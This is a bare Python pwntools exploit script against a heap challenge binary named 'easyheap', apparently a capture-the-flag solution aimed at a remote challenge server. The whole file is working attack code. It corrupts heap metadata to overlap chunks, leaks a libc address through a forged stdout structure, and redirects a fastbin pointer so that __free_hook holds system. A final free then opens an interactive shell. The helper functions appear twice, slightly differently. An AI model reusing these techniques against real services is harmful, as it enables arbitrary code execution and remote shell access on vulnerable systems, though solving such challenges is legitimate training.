from pwn import *
elf=ELF('./easyheap')
libc=elf.libc
io=remote('redirect.do-not-trust.hacking.run',10315)
#p=process('./easyheap')
context(log_level='debug')

def choice(c):
	io.recvuntil(':')
	io.sendline(str(c))

def add(size,content):
	choice(1)
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(str(content))

def edit(index,size,content):
	choice(2)
	io.recvuntil(':')
	io.sendline(str(index))
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(content)

def free(index):
	choice(3)
	io.recvuntil(':')
	io.sendline(str(index))

def choice(c):
	io.recvuntil(':')
	io.sendline(str(c))

def add(size,content):
	choice(1)
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(content)

def edit(index,size,content):
	choice(2)
	io.recvuntil(':')
	io.sendline(str(index))
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(content)

def free(index):
	choice(3)
	io.recvuntil(':')
	io.sendline(str(index))
bss=0x6020ad
system=0x400700
add(0x100,'AAA')
add(0x60,'AAA')
add(0xf0,'AAA')
add(0x60,'AAA')
free(0)
edit(1,0x80,b'a'*0x60+p64(0x180)+p64(0x100))
free(2)
free(1)
add(0x100,'AAAA')
edit(0,0x120,b'A'*0x100+p64(0x110)+p64(0x71)+b'\xdd\x25')
add(0x60,'A')
add(0x60,b'A'*0x33+p64(0xfbad1800)+p64(0)*3+b'\x00')
libc_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x3c5600
print(hex(libc_addr))
free_hook=libc.sym["__free_hook"]+libc_addr
print(hex(free_hook))
add(0x60,'aaa')
add(0x60,'aaa')
add(0x60,'aaa')
free(6)
edit(5,0x80,b'a'*0x60+p64(0)+p64(0x71)+p64(bss))
add(0x60,'aaa')
add(0x60,b'aaa'+b'a'*0x20+p64(free_hook))
edit(0,0x10,p64(system))
edit(1,0x10,b"sh\x00")
free(1)
io.interactive()